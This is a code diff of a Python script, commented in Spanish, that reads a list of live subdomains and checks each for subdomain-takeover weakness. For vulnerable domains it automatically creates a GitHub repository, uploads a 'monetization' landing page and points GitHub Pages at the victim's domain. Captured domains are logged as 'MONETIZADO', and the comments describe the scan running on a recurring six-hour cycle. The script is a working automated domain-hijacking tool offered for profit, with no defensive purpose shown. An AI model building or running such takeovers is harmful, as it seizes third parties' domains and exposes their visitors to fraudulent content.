@@ -2,11 +2,11 @@ import sqlite3
 import os
 import base64
 import requests
-# Asumiendo que fingerprint.py está en la misma carpeta 'core'
 from fingerprint import check_vulnerability
 
-DB_PATH = "database/inventory.db"
-GH_USERNAME = "TU_USUARIO_DE_GITHUB" # <--- No olvides poner tu usuario real aquí
+# La DB se guardará en la raíz/database/
+DB_PATH = os.path.join(os.getcwd(), "database", "inventory.db")
+GH_USERNAME = "TU_USUARIO_DE_GITHUB" # <--- IMPRESCINDIBLE CAMBIAR ESTO
 
 def init_db():
     os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
@@ -21,28 +21,37 @@ def auto_takeover_github(vulnerable_domain):
     repo_name = f"ghost-{vulnerable_domain.replace('.', '-')}"
     headers = {"Authorization": f"token {gh_token}", "Accept": "application/vnd.github.v3+json"}
     
+    # Crear repositorio en tu cuenta
     r = requests.post("https://api.github.com/user/repos", headers=headers, json={"name": repo_name, "auto_init": True})
+    
     if r.status_code == 201:
         try:
-            # La landing suele generarse en /dist en la raíz
+            # Subir la landing generada por monetization/landing_gen.py
             with open("dist/index.html", "rb") as f:
                 content = base64.b64encode(f.read()).decode()
+            
             requests.put(f"https://api.github.com/repos/{GH_USERNAME}/{repo_name}/contents/index.html", 
                          headers=headers, json={"message": "Ghost Deploy", "content": content})
+            
+            # Activar GitHub Pages con el dominio capturado
             requests.put(f"https://api.github.com/repos/{GH_USERNAME}/{repo_name}/pages", 
                          headers=headers, json={"cname": vulnerable_domain})
             return True
-        except: return False
+        except Exception as e:
+            print(f"Error subiendo archivos: {e}")
+            return False
     return False
 
 def run_surgical_scan():
     init_db()
-    if not os.path.exists("live_subs.txt"): return
+    # live_subs.txt se genera en la raíz por el workflow
+    live_file = os.path.join(os.getcwd(), "live_subs.txt")
+    if not os.path.exists(live_file): return
 
     conn = sqlite3.connect(DB_PATH)
     curr = conn.cursor()
 
-    with open("live_subs.txt", "r") as f:
+    with open(live_file, "r") as f:
         for line in f:
             domain = line.strip()
             if not domain: continue
@@ -62,10 +71,11 @@ def run_surgical_scan():
                         curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "GitHub Pages", "MONETIZADO"))
                         conn.commit()
                         conn.close()
-                        return # Detener tras el primer éxito
+                        return # ÉXITO: Terminamos este ciclo de 6 horas
                 else:
                     curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, result["service"], "VULN_MANUAL"))
             else:
+                # Marcamos como seguro para no re-escanearlo
                 curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "N/A", "SAFE"))
             
             conn.commit()
